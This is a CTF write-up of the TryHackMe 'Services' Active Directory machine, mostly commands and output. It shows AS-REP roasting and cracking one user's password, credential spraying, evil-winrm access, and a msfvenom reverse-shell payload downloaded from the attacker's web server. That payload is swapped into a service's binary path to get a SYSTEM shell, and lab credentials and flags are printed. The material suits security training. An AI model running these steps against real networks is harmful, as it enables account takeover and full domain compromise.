
# CTF Writeup: Services

---
## Reconaissance

An initial scan revealed the following running services on the target server.

```
nmap -p- 10.112.153.45           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 20:15 CDT
Nmap scan report for 10.112.153.45
Host is up (0.011s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49684/tcp open  unknown
49692/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 32.09 seconds
```

Another further scan revealed detailled information about the running services.

```
nmap -A -p- 10.112.153.45
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 20:17 CDT
Nmap scan report for 10.112.153.45
Host is up (0.013s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Above Services
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-11 01:17:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Not valid before: 2026-05-10T01:15:17
|_Not valid after:  2026-11-09T01:15:17
| rdp-ntlm-info: 
|   Target_Name: SERVICES
|   NetBIOS_Domain_Name: SERVICES
|   NetBIOS_Computer_Name: WIN-SERVICES
|   DNS_Domain_Name: services.local
|   DNS_Computer_Name: WIN-SERVICES.services.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-11T01:18:56+00:00
|_ssl-date: 2026-05-11T01:19:05+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=5/10%OT=53%CT=1%CU=42329%PV=Y%DS=3%DC=T%G=Y%TM=6A012E8
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=100%GCD=2%ISR=105%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=104%GCD=1%ISR
OS:=106%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%II=I%SS
OS:=S%TS=U)SEQ(SP=107%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M4E8NW8
OS:NNS%O2=M4E8NW8NNS%O3=M4E8NW8%O4=M4E8NW8NNS%O5=M4E8NW8NNS%O6=M4E8NNS)WIN(
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%TG=80%W=FFF
OS:F%O=M4E8NW8NNS%CC=Y%Q=)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4E8NW8NNS%CC=Y%Q=)T1(
OS:R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=Y%DF=Y%TG=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%TG=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%TG=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T
OS:G=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=80%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%TG=80%CD=Z)IE(
OS:R=Y%DFI=N%T=80%CD=Z)

Network Distance: 3 hops
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-11T01:18:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   9.26 ms  192.168.128.1
2   ...
3   10.24 ms 10.112.153.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.74 seconds
```

This seems to be an Domain Controller. The scan revealed the Domain. Let's map it to the target ip in our local dns file.

```
echo "10.112.153.45 services.local" | tee -a /etc/hosts
```

Since all of the Services weren't accessible, I will check out the running webserver.

Enumerated E-Mails in the source code.

```
curl -s http://services.local | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
j.doe@services.local
```

![[Pasted image 20260511032748.png]]

Since we know how the usernames/mails are being saved. We'll create the wordlist as following:

```
j.doe
j.rock
w.masters
j.larusso
```

Found more potential usernames.

```
m.john
j.warner
t.antonio
l.doe
```

Verified with kerbrute that those are valid usernames.

```
./kerbrute -d services.local --dc 10.114.174.134 userenum ~/ctfs/thm/ad/services/users_wordlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/14/26 - Ronnie Flathers @ropnop

2026/05/14 10:17:24 >  Using KDC(s):
2026/05/14 10:17:24 >   10.114.174.134:88

2026/05/14 10:17:24 >  [+] VALID USERNAME:       j.doe@services.local
2026/05/14 10:17:24 >  [+] VALID USERNAME:       w.masters@services.local
2026/05/14 10:17:24 >  [+] VALID USERNAME:       j.larusso@services.local
2026/05/14 10:17:24 >  [+] VALID USERNAME:       j.rock@services.local
2026/05/14 10:17:24 >  Done! Tested 4 usernames (4 valid) in 0.047 seconds
```

Performed ASREP-Roasting with my userlist and gained an TGT Hash for user "j.rock".

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py services.local/ -no-pass -usersfile users_wordlist.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$j.rock@SERVICES.LOCAL:19e502171fb4970a93ecf6670463ff3f$97ec2a47aac88d7df7aaaa2fef3af0de5054f40f6a1ea607cb4bf0e24408e1dfd389abf2eb18bdfd23472f1ab6d43bc4d8e97d0969e6d92ec07437e1c3fb2dc03e7301082307a15a57f73e786f86eb99312b6ff3284325a6fe373c7fbf67408ea0295b384918fc8261c13a2ed313af85ec14d2661c18642f636b09060059c350c0700b517d20f4aea0acc5600223368203e40c99a6d6cca6a19066c169033cce78f596801e022e804f57a46483c2a8ebf33b78f4a8db148692414983980ee216bead511fb4d2ff34a32a4e5a69dff5fb85a3325b865dca9c2bae8c664185650e084e11d7f67f2962566fb56fa8a50b9d
[-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Bruteforced an password out of an tgt_hash.

```
john tgt_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Serviceworks1    ($krb5asrep$23$j.rock@SERVICES.LOCAL)     
1g 0:00:00:09 DONE (2026-05-14 10:24) 0.1097g/s 1164Kp/s 1164Kc/s 1164KC/s SexySlym23..Sergio03
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Gained valid credentials for user "j.rock".

```
j.rock:Serviceworks1
```

We sprayed the credentials on multiple running services and got an hit on winrm & ldap.

```
nxc winrm services.local -u 'j.rock' -p 'Serviceworks1'
WINRM       10.114.174.134  5985   WIN-SERVICES     [*] Windows 10 / Server 2019 Build 17763 (name:WIN-SERVICES) (domain:services.local)
WINRM       10.114.174.134  5985   WIN-SERVICES     [+] services.local\j.rock:Serviceworks1 (Pwn3d!)
```

```
nxc ldap services.local -u 'j.rock' -p 'Serviceworks1' 
[*] Initializing LDAP protocol database
LDAP        10.114.174.134  389    WIN-SERVICES     [*] Windows 10 / Server 2019 Build 17763 (name:WIN-SERVICES) (domain:services.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.114.174.134  389    WIN-SERVICES     [+] services.local\j.rock:Serviceworks1 (Pwn3d!)
```

Connected to WIN-SERVICES as user j.rock via evil-winrm.

```
evil-winrm -i services.local -u 'j.rock' -p 'Serviceworks1'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.rock\Documents>
```

Retrieved user.txt in C:\Users\j.rock\Desktop

```
THM{ASr3p_R0aSt1n6}
```

Checked privileges of our current user.

![[Pasted image 20260514182923.png]]

It seems that he has "SeShutdownPrivilege" activated, which could hint that we would have to exploit an binary/dll/service.

Checked services in which we have permissions over binaries. (evil-winrm in-built function)

```
*Evil-WinRM* PS C:\Program Files\Amazon\cfn-bootstrap> services

Path                                                                           Privileges Service          
----                                                                           ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                            True ADWS             
"C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                   True AmazonSSMAgent   
"C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                     True AWSLiteAgent     
"C:\Program Files\Amazon\cfn-bootstrap\winhup.exe"                                   True cfn-hup          
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                     True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"          False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                           False TrustedInstaller 
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\NisSrv.exe"        True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\MsMpEng.exe"       True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                False WMPNetworkSvc
```

2. Create malicious binary with "msfvenom".

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
```

3. Start up python webserver on local machine.

```
python3 -m http.server 80
```

3. Download .exe onto target server.

```
iwr -uri http://192.168.227.246/shell.exe -o shell.exe
```

4. Start up listener.

```
rlwrap nc -lvnp 443
```

5. Point the Service to our malicious .exe file.

```
sc.exe config AWSLiteAgent binPATH= "C:\temp/shell.exe"
```

6. Stop Service

```
sc.exe stop AWSLiteAgent
```

7. Start Service 

```
sc.exe start AWSLiteAgent
```

8. Gained RCE as user "NT AUTHORITY\SYSTEM".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.227.246] from (UNKNOWN) [10.114.174.134] 54043
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
THM{S3rv3r_0p3rat0rS}
```